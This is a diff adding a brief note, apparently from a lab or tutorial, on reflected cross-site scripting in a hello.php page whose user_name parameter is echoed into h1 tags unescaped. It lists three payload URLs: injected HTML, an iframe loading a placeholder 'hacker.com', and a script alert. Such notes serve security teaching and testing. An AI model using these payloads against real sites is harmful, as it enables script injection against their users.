@@ -1,0 +1,9 @@
+-> Temporary XSS Variant 1
+
+As our input is simply appended into the <h1> tags, we can pass our own html in the user_name parameter and that HTML/JS will get appended to the output.
+
+http://url/hello.php?user_name=<a>hacked</a>
+
+http://url/hello.php?user_name=<iframe src=”hacker.com”></iframe>
+
+http://url/hello.php?user_name=<script>alert(0);</script>
